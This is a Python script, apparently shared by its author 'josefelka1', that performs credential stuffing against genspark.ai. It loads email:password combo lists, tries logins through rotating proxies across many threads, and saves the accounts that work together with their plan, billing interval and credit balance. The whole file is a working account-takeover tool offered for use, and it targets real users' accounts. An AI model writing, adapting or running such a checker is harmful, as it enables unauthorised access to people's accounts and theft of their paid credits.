import requests
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# ──────────────────────────────────────────────
#  COUNTERS
# ──────────────────────────────────────────────
lock       = Lock()
checked    = 0
valid      = 0
invalid    = 0
errors     = 0

# ──────────────────────────────────────────────
#  BANNER
# ──────────────────────────────────────────────
def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print("\033[1;36m" + "═" * 62)
    print("""
   ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ██████╗ ██╗  ██╗
  ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
  ██║  ███╗█████╗  ██╔██╗ ██║███████╗██████╔╝███████║██████╔╝█████╔╝ 
  ██║   ██║██╔══╝  ██║╚██╗██║╚════██║██╔═══╝ ██╔══██║██╔══██╗██╔═██╗ 
  ╚██████╔╝███████╗██║ ╚████║███████║██║     ██║  ██║██║  ██║██║  ██╗
   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    """)
    print("\033[1;33m" + "  TOOL   : Genspark.ai Account Checker")
    print("  TARGET : https://www.genspark.ai")
    print("  CHECKS : Plan  |  Credits Balance")
    print("  BY     : josefelka1")
    print("\033[1;36m" + "═" * 62 + "\033[0m")

# ──────────────────────────────────────────────
#  STATUS LINE
# ──────────────────────────────────────────────
def update_title():
    sys.stdout.write(
        f"\r\033[1;37m Checked: \033[1;33m{checked}"
        f"  \033[1;32mValid: {valid}"
        f"  \033[1;31mInvalid: {invalid}"
        f"  \033[1;35mErrors: {errors}   "
    )
    sys.stdout.flush()

# ──────────────────────────────────────────────
#  LOGIN  →  grab cookies/token
# ──────────────────────────────────────────────
LOGIN_URL   = "https://www.genspark.ai/api/auth/login"
USER_URL    = "https://www.genspark.ai/api/user"
BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"

HEADERS_BASE = {
    "User-Agent"  : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/124.0.0.0 Safari/537.36",
    "Accept"      : "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Referer"     : "https://www.genspark.ai/",
    "Origin"      : "https://www.genspark.ai",
}

def login(email: str, password: str, proxy: dict | None = None):
    """
    POST login → returns a requests.Session with auth cookies on success,
    or None on failure.
    """
    session = requests.Session()
    session.headers.update(HEADERS_BASE)

    payload = {"email": email, "password": password}
    try:
        r = session.post(
            LOGIN_URL,
            json=payload,
            proxies=proxy,
            timeout=15,
            allow_redirects=True,
        )
        # Some implementations return 200 with a token in JSON
        if r.status_code in (200, 201):
            try:
                data = r.json()
                token = (
                    data.get("token")
                    or data.get("access_token")
                    or data.get("data", {}).get("token")
                )
                if token:
                    session.headers.update({"Authorization": f"Bearer {token}"})
            except Exception:
                pass
            return session
        return None
    except Exception:
        return None

# ──────────────────────────────────────────────
#  FETCH USER INFO
# ──────────────────────────────────────────────
def get_user_info(session: requests.Session, proxy: dict | None = None):
    """GET /api/user  →  returns dict with plan fields or None."""
    try:
        r = session.get(USER_URL, proxies=proxy, timeout=15)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

# ──────────────────────────────────────────────
#  FETCH CREDIT BALANCE
# ──────────────────────────────────────────────
def get_balance(session: requests.Session, proxy: dict | None = None):
    """GET /api/payment/get_credit_balance  →  returns balance int or None."""
    try:
        r = session.get(BALANCE_URL, proxies=proxy, timeout=15)
        if r.status_code == 200:
            data = r.json()
            # {"status":0,"message":"success","data":{"balance":9717,...}}
            return data.get("data", {}).get("balance")
    except Exception:
        pass
    return None

# ──────────────────────────────────────────────
#  CORE CHECK
# ──────────────────────────────────────────────
def check_account(combo: str, proxy_str: str | None, out_valid: str, out_invalid: str):
    global checked, valid, invalid, errors

    combo = combo.strip()
    if not combo or ":" not in combo:
        return

    email, _, password = combo.partition(":")

    proxy = None
    if proxy_str:
        proxy = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}

    # ── 1. Login ──────────────────────────────
    session = login(email, password, proxy)
    with lock:
        checked += 1

    if session is None:
        with lock:
            invalid += 1
        update_title()
        with open(out_invalid, "a", encoding="utf-8") as f:
            f.write(f"{combo}\n")
        print(f"\n  \033[1;31m[✗] INVALID\033[0m  {email}")
        return

    # ── 2. Grab user info ─────────────────────
    user_data = get_user_info(session, proxy)

    plan          = "N/A"
    interval      = "N/A"

    if user_data:
        # Try common key paths
        plan     = (
            user_data.get("personal_plan")
            or user_data.get("data", {}).get("personal_plan")
            or "N/A"
        )
        interval = (
            user_data.get("personal_paid_sub_interval")
            or user_data.get("data", {}).get("personal_paid_sub_interval")
            or "N/A"
        )

    # ── 3. Grab credit balance ────────────────
    balance = get_balance(session, proxy)
    balance_str = str(balance) if balance is not None else "N/A"

    # ── 4. Output ─────────────────────────────
    with lock:
        valid += 1
    update_title()

    result_line = (
        f"{combo} | Plan: {plan} | Interval: {interval} | Balance: {balance_str}"
    )

    with open(out_valid, "a", encoding="utf-8") as f:
        f.write(result_line + "\n")

    plan_color = "\033[1;32m" if plan in ("plus", "pro") else "\033[1;33m"
    print(
        f"\n  \033[1;32m[✓] VALID\033[0m  {email}"
        f"  {plan_color}[{plan.upper()}]\033[0m"
        f"  \033[1;36mInterval: {interval}\033[0m"
        f"  \033[1;35mBalance: {balance_str} credits\033[0m"
    )

# ──────────────────────────────────────────────
#  MAIN
# ──────────────────────────────────────────────
def main():
    banner()

    combo_file   = input("\033[1;32m  Combo file (email:pass)  : \033[1;33m").strip()
    out_valid    = input("\033[1;32m  Output VALID file        : \033[1;33m").strip()
    out_invalid  = input("\033[1;32m  Output INVALID file      : \033[1;33m").strip()
    proxy_file   = input("\033[1;32m  Proxy file (leave blank) : \033[1;33m").strip()
    threads_in   = input("\033[1;32m  Threads                  : \033[1;33m").strip()
    print("\033[0m")

    threads = int(threads_in) if threads_in.isdigit() else 10

    # Load combos
    if not os.path.isfile(combo_file):
        print(f"\033[1;31m  [!] Combo file not found: {combo_file}")
        sys.exit(1)
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        combos = [l.strip() for l in f if l.strip() and ":" in l]

    # Load proxies
    proxies_list = [None]
    if proxy_file and os.path.isfile(proxy_file):
        with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
            proxies_list = [l.strip() for l in f if l.strip()] or [None]

    print(f"\033[1;36m  Loaded {len(combos)} combos | {len(proxies_list)} proxies | {threads} threads\033[0m\n")
    time.sleep(1)

    proxy_index = 0

    def task(combo):
        nonlocal proxy_index
        with lock:
            px = proxies_list[proxy_index % len(proxies_list)]
            proxy_index += 1
        check_account(combo, px, out_valid, out_invalid)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(task, c) for c in combos]
        for _ in as_completed(futures):
            pass

    print(f"\n\n\033[1;36m{'═'*62}")
    print(f"  Done!  Valid: \033[1;32m{valid}\033[1;36m  |  Invalid: \033[1;31m{invalid}\033[1;36m  |  Errors: \033[1;35m{errors}")
    print(f"  Results saved to: \033[1;33m{out_valid}\033[0m")
    input("\n  Press ENTER to exit...")

if __name__ == "__main__":
    main()
